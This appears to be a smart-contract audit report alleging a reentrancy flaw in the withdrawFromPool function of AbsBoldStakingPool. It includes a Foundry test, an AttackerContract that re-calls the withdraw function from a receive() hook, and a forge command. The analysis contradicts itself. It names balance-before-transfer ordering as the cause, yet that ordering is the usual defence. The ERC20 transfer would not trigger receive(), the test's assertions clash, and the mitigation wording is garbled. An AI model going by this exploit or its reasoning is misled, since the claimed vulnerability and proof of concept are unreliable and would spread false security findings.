# Vulnerability details

## Impact
loss of user funds stored in ```AbsBoldStakingPool```

## Proof of Concept
The ```withdrawFromPool``` function updates the user's balance 
```
depositBalance[msg.sender]
``` 
before transferring the tokens 

```
IERC20(stakeToken).safeTransfer(msg.sender, amount)
``` 
which will allow any malicious contract to exploit the function.

Here's the attack scenario:

The attacker deposits tokens into the ```AbsBoldStakingPool``` contract using the ```depositIntoPool``` function.

Now attacker can call the ```withdrawFromPool``` function from the Malicious Contract hence that ```AbsBoldStakingPool``` contract updates the token balance before transferring tokens.

Before the token transfer is completed the malicious contract can call the ```withdrawFromPool``` function repeatedly to drain ```AbsBoldStakingPool```

Here's a POC that demonstrate the attack 

Add testReentrancyAttack function in the ```test/AbsBoldStakingPool.t.sol``` import "./AttackerContract.sol";



```solidity
function testReentrancyAttack() external {
    uint256 attackerBalance = 5 ether;
    token.transfer(address(this), attackerBalance);

    AttackerContract attacker = new AttackerContract(pool, token);
    token.transfer(address(attacker), attackerBalance);

    vm.prank(address(attacker));
    attacker.attack(attackerBalance);

    assertEq(token.balanceOf(address(attacker)), attackerBalance, "Attacker balance should not change");
    assertEq(token.balanceOf(address(pool)), 0, "Pool should be drained");
}
```


```AttackerContract.sol```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/assertionStakingPool/AbsBoldStakingPool.sol";
import "./AbsBoldStakingPool.t.sol";


contract AttackerContract is Test {
    AbsBoldStakingPool public pool;
    IERC20 public token;
    uint256 public initialBalance;

    constructor(AbsBoldStakingPool _pool, IERC20 _token) {
        pool = _pool;
        token = _token;
    }

    function attack(uint256 amount) external {
        initialBalance = token.balanceOf(address(this));
        token.approve(address(pool), type(uint256).max);
        pool.depositIntoPool(amount);
        pool.withdrawFromPool();
    }

    receive() external payable {
        pool.withdrawFromPool();
    }
}
```
Run the test 

```javascript
forge test --match-test testReentrancyAttack -vvvv
```

## Recommended Mitigation Steps
Consider using OpenZeppelin's ReentrancyGuard, calling the ```withdrawFromPool``` to be last step of any transaction, after all checkd have
been performed.
